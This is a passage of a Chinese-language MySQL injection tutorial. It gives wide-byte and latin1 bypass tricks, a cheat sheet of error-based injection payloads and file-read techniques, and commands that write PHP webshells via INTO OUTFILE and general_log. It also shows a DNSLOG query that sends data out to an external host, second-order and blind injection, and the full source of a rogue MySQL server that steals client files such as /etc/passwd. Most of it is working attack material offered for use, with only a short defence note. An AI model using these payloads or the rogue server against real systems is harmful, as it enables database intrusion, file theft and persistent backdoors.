'admin\\'#' and password='123'; 注意：我们输入的单引号被转义掉了，此时SQL语句的功能是：查找用户名为admin'#且密码为123的用户。 但是我们注意到，在拼接SQL语句并与数据库进行通信之前，我们执行了这么一条语句： 1$conn-&gt;query(&quot;set names 'gbk';&quot;); 其作用相当于： 123mysql&gt;SET character_set_client ='gbk';mysql&gt;SET character_set_results ='gbk';mysql&gt;SET character_set_connection ='gbk'; 当我们输入的数据为：username=%df%27or%201=1%23&amp;password=123 经过addslashes函数处理最终变成：username=%df%5c%27or%201=1%23&amp;password=123 经过gbk解码得到：username=運'or 1=1#、password=123，拼接到SQL语句得： 1select * from users where username = '運'or 1=1#' and password='123'; 成功跳出了addslashes的转义限制。 具体解释前边提到：set names 'gbk';相当于执行了如下操作： 123mysql&gt;SET character_set_client ='gbk';mysql&gt;SET character_set_results ='gbk';mysql&gt;SET character_set_connection ='gbk'; 那么此时在SQL语句在与数据库进行通信时，会先将SQL语句进行对应的character_set_client所设置的编码进行转码，本例是gbk编码。 由于PHP的编码为UTF-8，我们输入的内容为%df%27，会被当做是两个字符，其中%27为单引号'。 经过函数addslashes处理变成%df%5c%27，%5c为反斜线\\。 在经过客户端层character_set_client编码处理后变成：運'，成功将反斜线给“吞”掉了，使单引号逃逸出来。 Latin1默认编码讲完了gbk造成的编码问题，我们再讲讲latin1造成的编码问题。 老样子，先举个例子。 1234567891011121314151617181920212223242526272829303132333435363738&lt;?php//该代码节选自：离别歌's blog$mysqli = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;cat&quot;);/* check connection */if ($mysqli-&gt;connect_errno) { printf(&quot;Connect failed: %s\\n&quot;, $mysqli-&gt;connect_error); exit();}$mysqli-&gt;query(&quot;set names utf8&quot;);$username = addslashes($_GET['username']);//我们在其基础上添加这么一条语句。if($username === 'admin'){ die(&quot;You can't do this.&quot;);}/* Select queries return a resultset */$sql = &quot;SELECT * FROM `table1` WHERE username='{$username}'&quot;;if ($result = $mysqli-&gt;query( $sql )) { printf(&quot;Select returned %d rows.\\n&quot;, $result-&gt;num_rows); while ($row = $result-&gt;fetch_array(MYSQLI_ASSOC)) { var_dump($row); } /* free result set */ $result-&gt;close();} else { var_dump($mysqli-&gt;error);}$mysqli-&gt;close();?&gt; 建表语句如下： 123456CREATE TABLE `table1` ( `id` int(10) unsigned NOT NULL AUTO_INCREMENT, `username` varchar(255) COLLATE latin1_general_ci NOT NULL, `password` varchar(255) COLLATE latin1_general_ci NOT NULL, PRIMARY KEY (`id`)) ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci; 我们设置表的编码为latin1，事实上，就算你不填写，默认编码便是latin1。 我们往表中添加一条数据：insert table1 VALUES(1,'admin','admin'); 注意查看源代码： 123if($username === 'admin'){ die(&quot;You can't do this.&quot;);} 我们对用户的输入进行了判断，若输入内容为admin，直接结束代码输出返回，并且还对输出的内容进行addslashes处理，使得我们无法逃逸出单引号。 这样的话，我们该怎样绕过这个限制，让页面输出admin的数据呢？ 我们注意到：$mysqli-&gt;query(&quot;set names utf8&quot;);这么一行代码，在连接到数据库之后，执行了这么一条SQL语句。 上边在gbk宽字节注入的时候讲到过：set names utf8;相当于： 123mysql&gt;SET character_set_client ='utf8';mysql&gt;SET character_set_results ='utf8';mysql&gt;SET character_set_connection ='utf8'; 前边说道：PHP的编码是UTF-8，而我们现在设置的也是UTF-8，怎么会产生问题呢？ 别着急，让我接着往下说。前边我们提到：SQL语句会先转成character_set_client设置的编码。但，他接下来还会继续转换。character_set_client客户端层转换完毕之后，数据将会交给character_set_connection连接层处理，最后在从character_set_connection转到数据表的内部操作字符集。 来本例中，字符集的转换为：UTF-8—&gt;UTF-8-&gt;Latin1 这里需要讲一下UTF-8编码的一些内容。 UTF-8编码是变长编码，可能有1~4个字节表示： 一字节时范围是[00-7F] 两字节时范围是[C0-DF][80-BF] 三字节时范围是[E0-EF][80-BF][80-BF] 四字节时范围是[F0-F7][80-BF][80-BF][80-BF] 然后根据RFC 3629规范，又有一些字节值是不允许出现在UTF-8编码中的： 所以最终，UTF-8第一字节的取值范围是：00-7F、C2-F4。 关于所有的UTF-8字符，你可以在这个表中一一看到： http://utf8-chartable.de/unicode-utf8-table.pl 引自：Mysql字符编码利用技巧 利用这一特性，我们输入：?username=admin%c2，%c2是一个Latin1字符集不存在的字符。 由上述，可以简单的知道：%00-%7F可以直接表示某个字符、%C2-%F4不可以直接表示某个字符，他们只是其他长字节编码结果的首字节。 但是，这里还有一个Trick：Mysql所使用的UTF-8编码是阉割版的，仅支持三个字节的编码。所以说，Mysql中的UTF-8字符集只有最大三字节的字符，首字节范围：00-7F、C2-EF。 而对于不完整的长字节UTF-8编码的字符，若进行字符集转换时，会直接进行忽略处理。 利用这一特性，我们的payload为?username=admin%c2，此处的%c2换为%c2-%ef均可。 1SELECT * FROM `table1` WHERE username='admin' 因为admin%c2在最后一层的内部操作字符集转换中变成admin。 报错注入原理我们前边说到，报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的。 那么，我们具体来说说，都有哪些特殊函数，以及他们都该怎么使用。 MySQL的报错注入主要是利用MySQL的一些逻辑漏洞，如BigInt大数溢出等，由此可以将MySQL报错注入分为以下几类： BigInt等数据类型溢出 函数参数格式错误 主键/字段重复 exp()函数语法：exp(int) 适用版本：5.5.5~5.5.49 该函数将会返回e的x次方结果。正常如下图： 为什么会报错呢？我们知道，次方到后边每增加1，其结果都将跨度极大，而mysql能记录的double数值范围有限，一旦结果超过范围，则该函数报错。如下图： 我们的payload为：exp(~(select * from(select user())a)) 其中，~符号为运算符，意思为一元字符反转，通常将字符串经过处理后变成大整数，再放到exp函数内，得到的结果将超过mysql的double数组范围，从而报错输出。至于为什么需要用两层子查询，这点我暂时还没有弄明白，欢迎有了解的大牛找我讨论: ) 除了exp()之外，还有类似pow()之类的相似函数同样是可利用的，他们的原理相同。 updatexml()函数语法：updatexml(XML_document, XPath_string, new_value); 适用版本: 5.1.5+ 我们通常在第二个xpath参数填写我们要查询的内容。 与exp()不同，updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数的信息。 payload: updatexml(1,concat(0x7e,(select user()),0x7e),1) 前后添加~使其不符合xpath格式从而报错。 extractvalue()函数语法：EXTRACTVALUE (XML_document, XPath_string); 适用版本：5.1.5+ 利用原理与updatexml函数相同 payload: and (extractvalue(1,concat(0x7e,(select user()),0x7e))) rand()+group()+count()虚拟表报错原理：简单来说，是由于where条件每执行一次，rand函数就会执行一次，如果在由于在统计数据时判断依据不能动态改变，故rand()不能后接在order/group by上。 举一个例子：假设user表有三条数据，我们通过：select * from user group by username 来通过其中的username字段进行分组。 此过程会先建立一个虚拟表，存在两个字段：key，count 其中我们通过username来判断，其在此处是字段，首先先取第一行的数据：username=test&amp;password=test username为test出现一次，则现在虚表内查询是否存在test，若存在，则count+1，若不存在，则添加test，其count为1。 对于floor(rand(0)*2)，其中rand()函数，会生成0~1之间随机一个小数、floor()取整数部分、0是随机因子、乘2是为了让大于0.5的小数通过floor函数得1，否则永远为0。 若表中有三行数据：我们通过select * from user group by floor(rand(0)*2)进行排序的话。 注意，由于rand(0)的随机因子是被固定的，故其产生的随机数也被固定了，顺序为：011011… 首先group by需要执行的话，需要确定分组因子，故floor(rand(0)*2)被执行一次，得到的结果为0，接着在虚表内检索0，发现虚表没有键值为0的记录，故添加上，在进行添加时：floor(rand(0)*2)第二次被执行，得到结果1，故虚表插入的内容为key=1&amp;count=1。 第二次执行group by时：floor(rand(0)*2)先被运行一次，也就是第三次运行。得到结果1，查询虚表发现数据存在，因而直接让虚表内的key=1的count加一即可，floor(..)只运行了一次。 第三次执行group by时，floor被执行第四次，得到结果0，查询虚表不存在。再插入虚表时，floor(…)被执行第五次，得到结果1，故此时虚表将插入的值为key=1&amp;count=1，注意，此时虚表已有一条记录为：key=1&amp;count=2，并且字段key为主键，具有不可重复性，故虚表在尝试插入时将产生错误。 图文： 1.查询前默认会建立空虚拟表如下图: 2.取第一条记录，执行floor(rand(0)2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕，如下图: \\3.查询第二条记录，再次计算floor(rand(0)2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)2)不会被计算第二次，直接count(*)加1，第二条记录查询完毕，结果如下: 4.查询第三条记录，再次计算floor(rand(0)2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了。 5.整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。 引自：——Mysql报错注入原理分析(count()、rand()、group by) payload用法: union select count(*),2,concat(':',(select database()),':',floor(rand()*2))as a from information_schema.tables group by a 几何函数 GeometryCollection：id=1 AND GeometryCollection((select * from (select* from(select user())a)b)) polygon()：id=1 AND polygon((select * from(select * from(select user())a)b)) multipoint()：id=1 AND multipoint((select * from(select * from(select user())a)b)) multilinestring()：id=1 AND multilinestring((select * from(select * from(select user())a)b)) linestring()：id=1 AND LINESTRING((select * from(select * from(select user())a)b)) multipolygon() ：id=1 AND multipolygon((select * from(select * from(select user())a)b)) 不存在的函数随便适用一颗不存在的函数，可能会得到当前所在的数据库名称。 Bigint数值操作：当mysql数据库的某些边界数值进行数值运算时，会报错的原理。 如~0得到的结果：18446744073709551615 若此数参与运算，则很容易会错误。 payload: select !(select * from(select user())a)-~0; name_const()仅可取数据库版本信息 payload: select * from(select name_const(version(),0x1),name_const(version(),0x1))a uuid相关函数适用版本：8.0.x 参数格式不正确。 12mysql&gt; SELECT UUID_TO_BIN((SELECT password FROM users WHERE id=1));mysql&gt; SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1)); join using()注列名通过系统关键词join可建立两个表之间的内连接。 通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因(相同列名存在)，而发生错误。 并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。 123mysql&gt;select * from(select * from users a join (select * from users)b)c;mysql&gt;select * from(select * from users a join (select * from users)b using(username))c;mysql&gt;select * from(select * from users a join (select * from users)b using(username,password))c GTID相关函数参数格式不正确。 123mysql&gt;select gtid_subset(user(),1);mysql&gt;select gtid_subset(hex(substr((select * from users limit 1,1),1,1)),1);mysql&gt;select gtid_subtract((select * from(select user())a),1); 报错函数速查表注：默认MYSQL_ERRMSG_SIZE=512 类别 函数 版本需求 5.5.x 5.6.x 5.7.x 8.x 函数显错长度 Mysql报错内容长度 额外限制 主键重复 floor round ❓ ✔️ ✔️ ✔️ 64 data_type ≠ varchar 列名重复 name_const ❓ ✔️ ✔️ ✔️ ✔️ only version() 列名重复 join [5.5.49, ?) ✔️ ✔️ ✔️ ✔️ only columns 数据溢出 - Double 1e308 cot exp pow [5.5.5, 5.5.48] ✔️ MYSQL_ERRMSG_SIZE 数据溢出 - BIGINT 1+~0 [5.5.5, 5.5.48] ✔️ MYSQL_ERRMSG_SIZE 几何对象 geometrycollection linestring multipoint multipolygon multilinestring polygon [?, 5.5.48] ✔️ 244 空间函数 Geohash ST_LatFromGeoHash ST_LongFromGeoHash ST_PointFromGeoHash [5.7, ?) ✔️ ✔️ 128 GTID gtid_subset gtid_subtract [5.6.5, ?) ✔️ ✔️ ✔️ 200 JSON json_* [5.7.8, 5.7.11] ✔️ 200 UUID uuid_to_bin bin_to_uuid [8.0, ?) ✔️ 128 XPath extractvalue updatexml [5.1.5, ?) ✔️ ✔️ ✔️ ✔️ 32 摘自——Mysql 注入基础小结 文件读/写我们知道Mysql是很灵活的，它支持文件读/写功能。在讲这之前，有必要介绍下什么是file_priv和secure-file-priv。 简单的说：file_priv是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下述payload查询权限。 1select file_priv from mysql.user where user=$USER host=$HOST; secure-file-priv是一个系统变量，对于文件读/写功能进行限制。具体如下： 无内容，表示无限制。 为NULL，表示禁止文件读/写。 为目录名，表示仅允许对特定目录的文件进行读/写。 注：5.5.53本身及之后的版本默认值为NULL，之前的版本无内容。 三种方法查看当前secure-file-priv的值： 123select @@secure_file_priv;select @@global.secure_file_priv;show variables like &quot;secure_file_priv&quot;; 修改： 通过修改my.ini文件，添加：secure-file-priv= 启动项添加参数：mysqld.exe --secure-file-priv= 读Mysql读取文件通常使用load_file函数，语法如下： 1select load_file(file_path); 第二种读文件的方法： 1load data infile &quot;/etc/passwd&quot; into table test FIELDS TERMINATED BY '\\n'; #读取服务端文件 第三种： 1load data local infile &quot;/etc/passwd&quot; into table test FIELDS TERMINATED BY '\\n'; #读取客户端文件 限制： 前两种需要secure-file-priv无值或为有利目录。 都需要知道要读取的文件所在的绝对路径。 要读取的文件大小必须小于max_allowed_packet所设置的值 低权限读取文件5.5.53secure-file-priv=NULL读文件payload，mysql8测试失败，其他版本自测。 1234drop table mysql.m1;CREATE TABLE mysql.m1 (code TEXT );LOAD DATA LOCAL INFILE 'D://1.txt' INTO TABLE mysql.m1 fields terminated by '';select * from mysql.m1; Mysql连接数据库时可读取文件这个漏洞是mysql的一个特性产生的，是上述的第三种读文件的方法为基础的。 简单描述该漏洞：Mysql客户端在执行load data local语句的时，先想mysql服务端发送请求，服务端接收到请求，并返回需要读取的文件地址，客户端接收该地址并进行读取，接着将读取到的内容发送给服务端。用通俗的语言可以描述如下： 原本的查询流程为 123客户端：我要把我的win.ini文件内容插入test表中服务端：好，我要你的win.ini文件内容客户端：win.ini的内容如下.... 假设服务端由我们控制，把一个正常的流程篡改成如下 123客户端：我要把我的win.ini文件内容插入test表中服务端：好，我要你的conn.php内容客户端：conn.php的内容如下??? 例子部分修改自：CSS-T | Mysql Client 任意文件读取攻击链拓展 换句话说：load data local语句要读取的文件会受到服务端的控制。 其次，在Mysql官方文档对于load data local语句的安全说明中有这么一句话: A patched server could in fact reply with a file-transfer request to any statement, not just LOAD DATA LOCAL, so a more fundamental issue is that clients should not connect to untrusted servers. 意思是：服务器对客户端的文件读取请求实际上是可以返回给客户端发送给服务端的任意语句请求的，不仅仅只是load data local语句。 这就会产生什么结果呢？之前讲的例子，将可以变成： 123客户端：我需要查询test表下的xx内容服务端：我需要你的conn.php内容客户端：conn.php的内容如下??? 可以看到，客户端相当于被攻击者给半劫持了。 利用上述的特性，我们通过构造一个恶意的服务端，即可完成上述的过程。 简易恶意服务端代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249#代码摘自：https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py#!/usr/bin/env python#coding: utf8import socketimport asyncoreimport asynchatimport structimport randomimport loggingimport logging.handlersPORT = 3306log = logging.getLogger(__name__)log.setLevel(logging.DEBUG)tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')tmp_format.setFormatter(logging.Formatter(&quot;%(asctime)s:%(levelname)s:%(message)s&quot;))log.addHandler( tmp_format)filelist = (# r'c:\\boot.ini', r'c:\\windows\\win.ini',# r'c:\\windows\\system32\\drivers\\etc\\hosts',# '/etc/passwd',# '/etc/shadow',)#================================================#=======No need to change after this lines=======#================================================__author__ = 'Gifts'def daemonize(): import os, warnings if os.name != 'posix': warnings.warn('Cant create daemon on non-posix system') return if os.fork(): os._exit(0) os.setsid() if os.fork(): os._exit(0) os.umask(0o022) null=os.open('/dev/null', os.O_RDWR) for i in xrange(3): try: os.dup2(null, i) except OSError as e: if e.errno != 9: raise os.close(null)class LastPacket(Exception): passclass OutOfOrder(Exception): passclass mysql_packet(object): packet_header = struct.Struct('&lt;Hbb') packet_header_long = struct.Struct('&lt;Hbbb') def __init__(self, packet_type, payload): if isinstance(packet_type, mysql_packet): self.packet_num = packet_type.packet_num + 1 else: self.packet_num = packet_type self.payload = payload def __str__(self): payload_len = len(self.payload) if payload_len &lt; 65536: header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num) else: header = mysql_packet.packet_header.pack(payload_len &amp; 0xFFFF, payload_len &gt;&gt; 16, 0, self.packet_num) result = &quot;{0}{1}&quot;.format( header, self.payload ) return result def __repr__(self): return repr(str(self)) @staticmethod def parse(raw_data): packet_num = ord(raw_data[0]) payload = raw_data[1:] return mysql_packet(packet_num, payload)class http_request_handler(asynchat.async_chat): def __init__(self, addr): asynchat.async_chat.__init__(self, sock=addr[0]) self.addr = addr[1] self.ibuffer = [] self.set_terminator(3) self.state = 'LEN' self.sub_state = 'Auth' self.logined = False self.push( mysql_packet( 0, &quot;&quot;.join(( '\\x0a', # Protocol '3.0.0-Evil_Mysql_Server' + '\\0', # Version #'5.1.66-0+squeeze1' + '\\0', '\\x36\\x00\\x00\\x00', # Thread ID 'evilsalt' + '\\0', # Salt '\\xdf\\xf7', # Capabilities '\\x08', # Collation '\\x02\\x00', # Server Status '\\0' * 13, # Unknown 'evil2222' + '\\0', )) ) ) self.order = 1 self.states = ['LOGIN', 'CAPS', 'ANY'] def push(self, data): log.debug('Pushed: %r', data) data = str(data) asynchat.async_chat.push(self, data) def collect_incoming_data(self, data): log.debug('Data recved: %r', data) self.ibuffer.append(data) def found_terminator(self): data = &quot;&quot;.join(self.ibuffer) self.ibuffer = [] if self.state == 'LEN': len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1 if len_bytes &lt; 65536: self.set_terminator(len_bytes) self.state = 'Data' else: self.state = 'MoreLength' elif self.state == 'MoreLength': if data[0] != '\\0': self.push(None) self.close_when_done() else: self.state = 'Data' elif self.state == 'Data': packet = mysql_packet.parse(data) try: if self.order != packet.packet_num: raise OutOfOrder() else: # Fix ? self.order = packet.packet_num + 2 if packet.packet_num == 0: if packet.payload[0] == '\\x03': log.info('Query') filename = random.choice(filelist) PACKET = mysql_packet( packet, '\\xFB{0}'.format(filename) ) self.set_terminator(3) self.state = 'LEN' self.sub_state = 'File' self.push(PACKET) elif packet.payload[0] == '\\x1b': log.info('SelectDB') self.push(mysql_packet( packet, '\\xfe\\x00\\x00\\x02\\x00' )) raise LastPacket() elif packet.payload[0] in '\\x02': self.push(mysql_packet( packet, '\\0\\0\\0\\x02\\0\\0\\0' )) raise LastPacket() elif packet.payload == '\\x00\\x01': self.push(None) self.close_when_done() else: raise ValueError() else: if self.sub_state == 'File': log.info('-- result') log.info('Result: %r', data) if len(data) == 1: self.push( mysql_packet(packet, '\\0\\0\\0\\x02\\0\\0\\0') ) raise LastPacket() else: self.set_terminator(3) self.state = 'LEN' self.order = packet.packet_num + 1 elif self.sub_state == 'Auth': self.push(mysql_packet( packet, '\\0\\0\\0\\x02\\0\\0\\0' )) raise LastPacket() else: log.info('-- else') raise ValueError('Unknown packet') except LastPacket: log.info('Last packet') self.state = 'LEN' self.sub_state = None self.order = 0 self.set_terminator(3) except OutOfOrder: log.warning('Out of order') self.push(None) self.close_when_done() else: log.error('Unknown state') self.push('None') self.close_when_done()class mysql_listener(asyncore.dispatcher): def __init__(self, sock=None): asyncore.dispatcher.__init__(self, sock) if not sock: self.create_socket(socket.AF_INET, socket.SOCK_STREAM) self.set_reuse_addr() try: self.bind(('', PORT)) except socket.error: exit() self.listen(5) def handle_accept(self): pair = self.accept() if pair is not None: log.info('Conn from: %r', pair[1]) tmp = http_request_handler(pair)z = mysql_listener()daemonize()asyncore.loop() 需要注意的是：这个过程需要客户端允许使用load data local才行，不过这个信息在客户端尝试连接到服务端的数据包中可以找到。 写说完了读文件，那我们来说说mysql的写文件操作。常见的写文件操作如下： 12select 1,&quot;&lt;?php @assert($_POST['t']);?&gt;&quot; into outfile '/var/www/html/1.php';select 2,&quot;&lt;?php @assert($_POST['t']);?&gt;&quot; into dumpfile '/var/www/html/1.php'; 限制： secure-file-priv无值或为可利用的目录 需知道目标目录的绝对目录地址 目标目录可写，mysql的权限足够。 日志法由于mysql在5.5.53版本之后，secure-file-priv的值默认为NULL，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。 mysql日志文件的一些相关设置可以直接通过命令来进行： 12345678//请求日志mysql&gt; set global general_log_file = '/var/www/html/1.php';mysql&gt; set global general_log = on;//慢查询日志mysql&gt; set global slow_query_log_file='/var/www/html/2.php'mysql&gt; set global slow_query_log=1;//还有其他很多日志都可以进行利用... 之后我们在让数据库执行满足记录条件的恶意语句即可。 限制： 权限够，可以进行日志的设置操作 知道目标目录的绝对路径 DNSLOG带出数据什么是DNSLOG？简单的说，就是关于特定网站的DNS查询的一份记录表。若A用户对B网站进行访问/请求等操作，首先会去查询B网站的DNS记录，由于B网站是被我们控制的，便可以通过某些方法记录下A用户对于B网站的DNS记录信息。此方法也称为OOB注入。 如何用DNSLOG带出数据？若我们想要查询的数据为：aabbcc，那么我们让mysql服务端去请求aabbcc.evil.com，通过记录evil.com的DNS记录，就可以得到数据：aabbcc。 引自：Dnslog在SQL注入中的实战 payload: load_file(concat('\\\\\\\\',(select user()),'.xxxx.ceye.io\\xxxx')) 应用场景： 三大注入无法使用 有文件读取权限及secure-file-priv无值。 不知道网站/目标文件/目标目录的绝对路径 目标系统为Windows 推荐平台：ceye.io 为什么Windows可用，Linux不行？这里涉及到一个叫UNC的知识点。简单的说，在Windows中，路径以\\\\开头的路径在Windows中被定义为UNC路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows会先进行DNS查询。但是对于Linux来说，并没有这一标准，所以DNSLOG在Linux环境不适用。注：payload里的四个\\\\\\\\中的两个\\是用来进行转义处理的。 二次注入什么是二次注入？简单的说，就是攻击者构造的恶意payload首先会被服务器存储在数据库中，在之后取出数据库在进行SQL语句拼接时产生的SQL注入问题。 举个例子，某个查询当先登录的用户信息的SQL语句如下： 1select * from users where username='$_SESSION['username']' 登录/注册处的SQL语句都经过了addslashes函数、单引号闭合的处理，且无编码产生的问题。 对于上述举的语句我们可以先注册一个名为admin' #的用户名，因为在注册进行了单引号的转义，故我们并不能直接进行insert注入，最终将我们的用户名存储在了服务器中，注意：反斜杠转义掉了单引号，在mysql中得到的数据并没有反斜杠的存在。 在我们进行登录操作的时候，我们用注册的admin' #登录系统，并将用户部分数据存储在对于的SESSION中，如$_SESSION['username']。 上述的$_SESSION['username']并没有经过处理，直接拼接到了SQL语句之中，就会造成SQL注入，最终的语句为： 1select * from users where username='admin' #' order by比较盲注这种方法运用的情况比较极端一些，如布尔盲注时，字符截取/比较限制很严格。例子： 1select * from users where (select 'r' union select user() order by 1 limit 1)='r' 如果能一眼看出原理的话就不需要继续看下去了。 实际上此处是利用了order by语句的排序功能来进行判断的。若我们想要查询的数据开头的首字母在字母表的位值比我们判断的值要靠后，则limit语句将不会让其输出，那么整个条件将会成立，否之不成立。 利用这种方法可以做到不需要使用like、rlike、regexp等匹配语句以及字符操作函数。 再举个例子： 1select username,flag,password from users where username='$username;' 页面回显的字段为：username与password，如何在union与flag两单词被拦截、无报错信息返回的情况下获取到用户名为admin的flag值？ 我们前边讲到了无列名注入，通过使用union语句来对未知列名进行重命名的形式绕过，还讲过通过使用join using()报错注入出列名。但现在，这两种方法都不可以的情况下该如何获取到flag字段的内容？ 使用order by可轻松盲注出答案。payload： 1select username,flag,password from users where username='admin' union select 1,'a',3 order by 2 与之前的原理相同，通过判断前后两个select语句返回的数据前后顺序来进行盲注。 常见函数/符号归类注释符 单行注释 单行注释 单行注释 多行(内联)注释 # -- x //x为任意字符 ;%00 /*任意内容*/ 常用运算符 运算符 说明 运算符 说明 &amp;&amp; 与，同and。 丨丨 或，同or。注：此处由于markdown语法限制，用中文符号代替显示。 ! 非，同not。 ~ 一元比特反转。 ^ 异或，同xor。 + 加，可替代空格，如select+user()。 系统信息函数 函数 说明 USER() 获取当前操作句柄的用户名，同SESSION_USER()、CURRENT_USER()，有时也用SYSTEM_USER()。 DATABASE() 获取当前选择的数据库名，同SCHEMA()。 VERSION() 获取当前版本信息。 进制转换 函数 说明 ORD(str) 返回字符串第一个字符的ASCII值。 OCT(N) 以字符串形式返回 N 的八进制数，N 是一个BIGINT 型数值，作用相当于CONV(N,10,8)。 HEX(N_S) 参数为字符串时，返回 N_or_S 的16进制字符串形式，为数字时，返回其16进制数形式。 UNHEX(str) HEX(str) 的逆向函数。将参数中的每一对16进制数字都转换为10进制数字，然后再转换成 ASCII 码所对应的字符。 BIN(N) 返回十进制数值 N 的二进制数值的字符串表现形式。 ASCII(str) 同ORD(string)。 CONV(N,from_base,to_base) 将数值型参数 N 由初始进制 from_base 转换为目标进制 to_base 的形式并返回。 CHAR(N,… [USING charset_name]) 将每一个参数 N 都解释为整数，返回由这些整数在 ASCII 码中所对应字符所组成的字符串。 字符截取/拼接 函数 说明 SUBSTR(str,N_start,N_length) 对指定字符串进行截取，为SUBSTRING的简单版。 SUBSTRING() 多种格式SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)。 RIGHT(str,len) 对指定字符串从最右边截取指定长度。 LEFT(str,len) 对指定字符串从最左边截取指定长度。 RPAD(str,len,padstr) 在 str 右方补齐 len 位的字符串 padstr，返回新字符串。如果 str 长度大于 len，则返回值的长度将缩减到 len 所指定的长度。 LPAD(str,len,padstr) 与RPAD相似，在str左边补齐。 MID(str,pos,len) 同于 SUBSTRING(str,pos,len)。 INSERT(str,pos,len,newstr) 在原始字符串 str 中，将自左数第 pos 位开始，长度为 len 个字符的字符串替换为新字符串 newstr，然后返回经过替换后的字符串。INSERT(str,len,1,0x0)可当做截取函数。 CONCAT(str1,str2…) 函数用于将多个字符串合并为一个字符串 GROUP_CONCAT(…) 返回一个字符串结果，该结果由分组中的值连接组合而成。 MAKE_SET(bits,str1,str2,…) 根据参数1，返回所输入其他的参数值。可用作布尔盲注，如：EXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,'1','710'))。 常见全局变量 变量 说明 变量 说明 @@VERSION 返回版本信息 @@HOSTNAME 返回安装的计算机名称 @@GLOBAL.VERSION 同@@VERSION @@BASEDIR 返回MYSQL绝对路径 PS：查看全部全局变量SHOW GLOBAL VARIABLES;。 其他常用函数/语句 函数/语句 说明 LENGTH(str) 返回字符串的长度。 PI() 返回π的具体数值。 REGEXP “statement” 正则匹配数据，返回值为布尔值。 LIKE “statement” 匹配数据，%代表任意内容。返回值为布尔值。 RLIKE “statement” 与regexp相同。 LOCATE(substr,str,[pos]) 返回子字符串第一次出现的位置。 POSITION(substr IN str) 等同于 LOCATE()。 LOWER(str) 将字符串的大写字母全部转成小写。同：LCASE(str)。 UPPER(str) 将字符串的小写字母全部转成大写。同：UCASE(str)。 ELT(N,str1,str2,str3,…) 与MAKE_SET(bit,str1,str2...)类似，根据N返回参数值。 NULLIF(expr1,expr2) 若expr1与expr2相同，则返回expr1，否则返回NULL。 CHARSET(str) 返回字符串使用的字符集。 DECODE(crypt_str,pass_str) 使用 pass_str 作为密码，解密加密字符串 crypt_str。加密函数：ENCODE(str,pass_str)。 约束攻击什么是约束攻击？ 仍然是先举个例子： 我们先通过下列语句建立一个用户表 1234CREATE TABLE users( username varchar(20), password varchar(20)) 注册代码： 1234567891011121314151617&lt;?php$conn = mysqli_connect(&quot;127.0.0.1:3307&quot;, &quot;root&quot;, &quot;root&quot;, &quot;db&quot;);if (!$conn) { die(&quot;Connection failed: &quot; . mysqli_connect_error());}$username = addslashes(@$_POST['username']);$password = addslashes(@$_POST['password']);$sql = &quot;select * from users where username = '$username'&quot;;$rs = mysqli_query($conn,$sql);if($rs-&gt;fetch_row()){ die('账号已注册');}else{ $sql2 = &quot;insert into users values('$username','$password')&quot;; mysqli_query($conn,$sql2); die('注册成功');}?&gt; 登录判断代码： 123456789101112131415&lt;?php$conn = mysqli_connect(&quot;127.0.0.1:3307&quot;, &quot;root&quot;, &quot;root&quot;, &quot;db&quot;);if (!$conn) { die(&quot;Connection failed: &quot; . mysqli_connect_error());}$username = addslashes(@$_POST['username']);$password = addslashes(@$_POST['password']);$sql = &quot;select * from users where username = '$username' and password='$password';&quot;;$rs = mysqli_query($conn,$sql);if($rs-&gt;fetch_row()){ $_SESSION['username']=$password;}else{ echo &quot;fail&quot;;}?&gt; 在无编码问题，且进行了单引号的处理情况下仍可能发生什么SQL注入问题呢？ 我们注意到，前边创建表格的语句限制了username和password的长度最大为25，若我们插入数据超过25，MYSQL会怎样处理呢？答案是MYSQL会截取前边的25个字符进行插入。 而对于SELECT查询请求，若查询的数据超过25长度，也不会进行截取操作，这就产生了一个问题。 通常对于注册处的代码来说，需要先判断注册的用户名是否存在，再进行插入数据操作。如我们注册一个username=admin[25个空格]x&amp;password=123456的账号，服务器会先查询admin[25个空格]x的用户是否存在，若存在，则不能注册。若不存在，则进行插入数据的操作。而此处我们限制了username与password字段长度最大为25，所以我们实际插入的数据为username=admin[20个空格]&amp;password=123456。 接着进行登录的时，我们使用：username=admin&amp;password=123456进行登录，即可成功登录admin的账号。 防御： 给username字段添加unique属性。 使用id字段作为判断用户的凭证。 插入数据前判断数据长度。 堆叠注入简单的说，由于分号;为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法执行其他恶意语句，如RENAME、DROP等。 